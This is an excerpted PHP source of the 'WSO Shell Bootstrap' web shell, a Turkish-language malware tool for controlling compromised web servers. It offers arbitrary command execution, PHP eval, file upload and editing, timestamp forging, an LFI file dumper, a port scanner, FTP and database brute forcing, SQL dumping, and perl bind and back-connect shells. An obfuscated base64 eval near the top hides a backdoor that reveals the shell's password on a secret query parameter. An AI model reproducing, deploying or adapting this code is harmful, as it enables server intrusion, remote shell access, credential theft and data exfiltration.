...
$wsosecure="aWYoJF9HRVRbJ2FudGlkb3RlJ109PSdzb2Z0d2FyZScpew0KZWNobyAkYXV0aF9wYXNzOyANCn0=";
@eval(base64_decode($wsosecure));
function wsoLogin() {
	...
	<div style='margin-left:50px;margin-top:50px;' class='container-fluid'>
	<div class='rows'>
	<div class='col-md-3'></div>
	<div class='col-md-3'>
	<img style='webkit-box-shadow: -9px 6px 148px -2px rgba(0,0,0,0.81); -moz-box-shadow: -9px 6px 148px -2px rgba(0,0,0,0.81); box-shadow: -9px 6px 148px -2px rgba(0,0,0,0.81); 'src='http://data.whicdn.com/images/88700943/large.gif'>
	</div>
    ...
    <h3 class='panel-title'>Wso Giriş</h3>
    </div>
    <div class='panel-body'>
	<form class='form-horizontal' action='".$_SERVER['PHP_SELF']."'method='post'>
    <div class='form-group'>
      <label id='pass' class='col-lg-3 control-label'>Password</label>
      <div class='col-lg-8'>
        <input type='password' class='form-control input-sm' name='pass' id='pass' placeholder='*********'>
		  </div>
	</div>
	<div class='rows'>
   ...
   <iframe width='1' height='1' style='display:none;'' src='http://youtube.com/embed/CdWbdg1inGc?autoplay=1' frameborder='0' allowfullscreen></iframe>
   </body>
   </html>
	");
...
<input type=hidden name=charset>
	...
	if(!empty($GLOBALS['auth_pass']))
		$m['<i class="fa fa-power-off"></i> Logout'] = 'Logout';
	$m['<i class="fa fa-trash"></i> Remove Shell'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<li width="'.(int)(100/count($m)).'%"><a href="#"  class="btn btn-danger btn-xs" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> </li>';
...
<div class="rows"><!-- Rows -->
<div class="col-md-5">
<table style="margin-top:4px;" class="table table-striped table-hover">
  <thead>
     <tr class="info">
      <th><i class="fa fa-tachometer"></i> Sistem</th>
      <th><i class="fa fa-info-circle"></i> Bilgi &nbsp;&nbsp; <i class="fa fa-spinner fa-spin"></i> Charset:<select style="color:#d9534f;"onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select></th>
    </tr>
  </thead>
  <tbody>
  <tr class="danger">
   <td> <i class="fa fa-server"> </i> Uname:</td>
   <td>'.substr(@php_uname(), 0, 120).'</td>
  </tr>
   <tr class="danger">
  <td> <i class="fa fa-user"> </i>  User:</td>
    <td>'.$uid.' ( ' .$user.' ) <i class="fa fa-users"></i> Group: '. $gid . ' ( ' . $group . ' ) Server İp:'.@$_SERVER["SERVER_ADDR"].'</td>
  <tr>
    <tr class="danger">
  <td><i class="fa fa-bug"></i> PHP:</td>
  <td><i class="fa fa-code-fork"></i> Version: '. @phpversion() . ' <i class="fa fa-shield"></i> Safe Mode: '.($GLOBALS['safe_mode']?'<span class="label label-success">ON</span>':'<span class="label label-warning">OFF</span>').' <i class="fa fa-calendar"></i> Datetime: '.date('Y-m-d H:i:s').' <a href="#" onclick="g(\'Php\',null,\'\',\'info\')" class="btn btn-info btn-xs">Php İnfo</a></td>
  </tr>
  <tr class="danger">
   <td><i class="fa fa-database"></i> HDD:</td>
   <td><i class="fa fa-battery-half"></i> Size: '.wsoViewSize($totalSpace).'  <i class="fa fa-cogs"></i> Free:' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) .'%)
    <i class="fa fa-folder-open"></i> Driver :' . $drives . '
   </td>
  </tr>
  </table>
<ul class="breadcrumb">
...
'.$cwd_links .' |
<label class="text-info"><i style="color:#d9534f;" class="fa fa-hand-paper-o"></i> Dir Permission: '.wsoPermsColor($GLOBALS['cwd']).'</label>
</ul>
  </div>
  </div>
<div class="col-md-5">
...
<div style="margin-bottom:5pt;" class="container-fluid">
<ul class="nav nav-pills ">' . $menu . ' <li width="7%"><a  data-toggle="modal" data-target="#myModal" href="" class="btn btn-danger btn-xs""><i class="fa fa-info-circle"></i>  About</a></li></ul>
  ...
  <div class="modal-dialog">
    ...
    <div class="modal-content">
      ...
      <div class="modal-body">
       <center> 
	   <p><i class="fa fa-code"></i> Coded By Antidote</p>
	   <p><i class="fa fa-rocket"></i>  Thanks : ByDokunulmaz</p>
	   <p><i class="fa fa-bug"></i> Wso Shell : '.WSO_VERSION.'</p>
	   <p><i class="fa fa-user-secret"></i> <a target="_blank" href="http://spycod3.org/">Spycod3</a> Team 2016</p>
       <p><a href="http://antidotesoft.com"  target="_blank">Antidote Soft</a></p>
	   </center>
      </div>
...
function wsoFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <span class='label label-success'>Writeable</span>":" <span class='label label-warning'>Not Writeable</span>";
    echo "
 
</div>
<div style='margin-top:5pt;margin-left:8pt;margin-right:8pt;' class='container-fluid'>
<table class='table table-striped table-hover '>
  <thead>
	...
	<div class='col-md-4'>
	 <tr class='danger' >
	<td>Change dir:</td>
	<td><form onsubmit='g(null,this.c.value,\"\");return false;'><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input style='margin-left:3px;' class='btn btn-success btn-xs' type=submit value='>>'></form></td>
	<td>Read file:</td>
	<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><input class='toolsInp' type=text name=f><input style='margin-left:3px;' class='btn btn-success btn-xs' type=submit value='>>'></form></td>
	</tr>
	 <tr class='danger' >
	    <td>Make dir:$is_writable</td>
		<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><input class='toolsInp' type=text name=d><input style='margin-left:3px;' class='btn btn-success btn-xs' type=submit value='>>'></form></td>
		<td>Execute:</td>
		<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><input class='toolsInp' type=text name=c value=''><input style='margin-left:3px;' class='btn btn-success btn-xs' type=submit value='>>'></form></td>
	</tr>
  ...
  <div class='rows'>
   ...
   <div class='col-md-1'> </div>
	...
	<div class='col-md-4'>  <div  class='well'>
	  <span  class='label label-danger'>Upload file: $is_writable</span>
		<form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<button class='btn btn-danger btn-xs'><input  type=file name=f>	</button>
		<input class='btn btn-success btn-xs' type=submit value='>>'>
		</form>
</div></div>
	</div>
	</div>
	...
	<footer><center><small>Wso Shell Bootstrap  &copy;  Coded By <a target='_blank' class='xa' href='https://twitter.com/coderantidote'>Antidote</a></small> </center></footer>
...
function actionSecInfo() {
	wsoHeader();
	echo '<div class="container-fluid"><span class="label label-default">Server security information</span>
	<div style="margin-top:4px;" class="well">
	<br>';
	function wsoSecParam($n, $v) {
		...
		if($v) {
			...
			if(strpos($v, "\n") === false)
				...
				echo '<pre class="alert alert-dismissible alert-success">' . $v . '</pre> ';
		}
	}
...
function actionlfiscan() {
    wsoHeader();
    print '
	<div class="container-fluid"><span  class="label label-default">Led-Zeppelin\'s LFI File dumper</span>
    <div style="margin-top:4pt;" class="well">
 
   <form method="post" action="?"><input type="hidden" name="a" value="lfiscan">
      LFI URL: <input type="text" size="60" name="lfiurl" value=""> <input style="margin-left:3px;margin-bottom:3px;" class="btn btn-success btn-xs" type="submit" value="Go"> File: <select name="scantype">
         <option value="1">
            Access Log
         </option>
...
<table class="table table-striped table-hover ">
 <tr>
<th>
<span  class="label label-danger">Mailer</span> 
...
<input type=submit name=submit style="margin-top:3px;" class="btn btn-success btn-xs" value=Submit></form>
</th>';
 
 
echo '<th><span  class="label label-danger">Port Scanner</span>';
...
<input type="submit" style="margin-top:3px;" class="btn btn-success btn-xs" value="Scan Ports" />
</form></th>
...
echo "
<td>
<center><img src='http://www.yougetsignal.com/img/site_logo.gif'>
<form method='POST' action=''>
<input type='hidden' name='a' value='phptools'><input type='text' size='60' value='yahoo.com' name='ghost' />&nbsp;<input type='submit' value='&nbsp;&check;&nbsp;'></form>
</center>
";
...
function actionPhp() {
	...
	if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<div class="container-fluid"><span  class="label label-default">PHP info</span><style>
		hr {
...
.v {
    ...
    echo '<div class="container-fluid"><span  class="label label-default">Execution PHP-code(Eval)</span> 
	<div style="margin-top:4pt;" class="well">
...
<form name=files method=post><tr class='info'><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
    ...
    echo "<input style='margin-left:3px;' class='btn btn-success btn-xs'	 type='submit' value='>>'></td></tr></form></table></div>
	</div>	</div>
	";
	wsoFooter();
}
...
function actionStringTools() {
	...
	wsoHeader();
	echo '<div class="container-fluid"><span  class="label label-default">String conversions</span> <div style="margin-top:4pt;" class="well">';
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select style='color:#d9534f;' name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option style='color:#d9534f;' value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select><input type='submit' style='margin-left:3px;margin-bottom:3px;' class='btn btn-success btn-xs' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"</pre></div><span  class='label label-default'>Search text in files:</span><div style='margin-top:4pt;'  class='well'>
...
function actionFilesTools() {
	...
	wsoHeader();
	echo '<div class="container-fluid"><span  class="label label-default">File tools</span><br>';
	if( !file_exists(@$_POST['p1']) ) {
	...
	echo '<div  style="margin-top:4pt;"  class="well"><span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.wsoPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br></div>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
	...
	switch($_POST['p2']) {
		...
		case 'edit':
			...
			echo '</textarea><input type=submit style="margin-left:3px;margin-bottom:3px;" class="btn btn-success btn-xs" value=">>"></form>';
			break;
		case 'hexdump':
		...
		case 'rename':
			...
			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit style="margin-left:3px;margin-bottom:3px;" class="btn btn-success btn-xs" value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
			...
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit style="margin-left:3px;margin-bottom:3px;" class="btn btn-success btn-xs" value=">>"></form>';
			break;
	}
	echo '</div>';
	wsoFooter();
...
function add(cmd) {
	...
	echo '<div class="container-fluid"><span  class="label label-default">Console</span>
	<div style="margin-top:4pt;" class="well">
	 <form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
	...
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" style="margin-left:3px;margin-bottom:3px;" class="btn btn-success btn-xs" value=">>"> <nobr><input type=checkbox name=ajax value=1 '.(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_SESSION[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea name=output style="border-bottom:0;margin:0;width:100%;height:250px;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".wsoEx($_POST['p1']));
	}
	echo '</textarea><table> <tr><td width="1%"><i class="fa fa-usd"></i> &nbsp;</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
	echo '</form></div><script>d.cf.cmd.focus();</script></div></div>';
   echo "
   <footer><center><small>Wso Shell Bootstrap  &copy;  Coded By <a target='_blank' class='xa' href='https://twitter.com/coderantidote'>Antidote</a></small> </center></footer>
   ";
}
...
<meta http-equiv="refresh" content="5;URL='.$_SERVER['PHP_SELF'].'">
	...
	<div class="container" >
<div align="center">
<img  src="http://i.hizliresim.com/bDRW30.gif">  
</div><br>
<div class="row">
<div class="col-md-4"></div>
<div class="col-md-4">
<div class="alert alert-dismissible alert-info">
  <h4>Good Bye Hekır </h4>
  <p class="text-danger"> 
 
  Bidaha Görüsmemek Uzere <i class="fa fa-frown-o"></i>
  </p>
   <p class="text-primary"> 
   Seni 5 Saniye İçinde Uğurluyoruz.</i>
  </p>
</div>
<div id="myProgress">
    <div id="myBar"></div>
...
function actionSelfRemove() {
    ...
    if($_POST['p1'] != 'yes')
        wsoHeader();
	echo '<div class="container-fluid"><span  class="label label-default">Shelli Kaldır</span>
	<div style="margin-top:4pt;" class="well">Kaldırmak İstedinden Emin Mİsin?<br><a href=# style="margin-left:3px;margin-bottom:3px;" class="btn btn-success btn-xs"onclick="g(null,null,\'yes\')">Evet</a></div></div>';
	  echo "
   <footer><center><small>Wso Shell Bootstrap  &copy;  Coded By <a target='_blank' class='xa' href='https://twitter.com/coderantidote'>Antidote</a></small> </center></footer>
   ";
}
...
function actionBruteforce() {
	...
	echo '<div class="container-fluid"><span  class="label label-default">FTP bruteforce</span><div style="margin-top:4pt;" class="well"><table><form method=post><tr><td><span>Type</span></td>'
		.'<td><select style="color:#d9534f;" name=proto><option style="color:#d9534f;" value=ftp>FTP</option><option style="color:#d9534f;" value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>'
		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
		...
		.'</td></tr><tr><td></td><td><input type=submit style="margin-left:3px;margin-bottom:3px;" class="btn btn-success btn-xs" value=">>"></td></tr></form></table>';
	echo '</div></div><br>';
  echo "
   <footer><center><small>Wso Shell Bootstrap  &copy;  Coded By <a target='_blank' class='xa' href='https://twitter.com/coderantidote'>Antidote</a></small> </center></footer>
   ";
...
<div class='container-fluid'><span  class='label label-default'>Sql Browser</span>
<div style='margin-top:4pt;' class='well'>
<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'>
<td><select style='color:#d9534f;' name='type'><option style='color:#d9534f;' value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo ">MySql</option><option style='color:#d9534f;' value='pgsql' ";
...
<td><input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
	...
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			...
			$db->listDbs();
			echo "<select style='color:#d9534f;' name=sql_base><option style='color:#d9534f;' value=''></option>";
			while($item = $db->fetch()) {
	...
	echo "</td>
				...
				<td><input type=submit style='margin-left:3px;margin-bottom:3px;' class='btn btn-success btn-xs' value='>>' onclick='fs(d.sf);'></td>
	...
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				...
				echo "<input type='checkbox' onclick='is();'> <input type=button style='margin-left:3px;margin-bottom:3px;' class='btn btn-success btn-xs' value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
                ...
                echo "</textarea><br/><input type=submit style='margin-left:3px;margin-bottom:3px;' class='btn btn-success btn-xs' value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/>";
            if($_POST['type']=='mysql') {
                ...
                if($db->fetch())
                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input  style='margin-left:3px;margin-bottom:3px;' class='btn btn-success btn-xs' type=submit value='>>'></form>";
            }
...
function actionNetwork() {
	...
	<span  class='label label-default'>Network tools</span>
	<div style='margin-top:4pt;' class='well'>
	<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
	<span  class='label label-danger'>Bind port to /bin/sh [perl]</span><br/>
	<div style='width:230pt;' class='alert alert-dismissible alert-info'>
	Port: <input type='text' name='port' value='31337'> <input type=submit style='margin-left:3px;margin-bottom:3px;' class='btn btn-success btn-xs' value='>>'>
	</div>
	</form>
		<span  class='label label-danger'>Back-connect  [perl]</span><br/>
	<div style='width:230pt;' class='alert alert-dismissible alert-info'>
	<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
 
	Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='31337'> <input style='margin-left:3px;margin-bottom:3px;' class='btn btn-success btn-xs' type=submit value='>>'>
	</form></div>";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
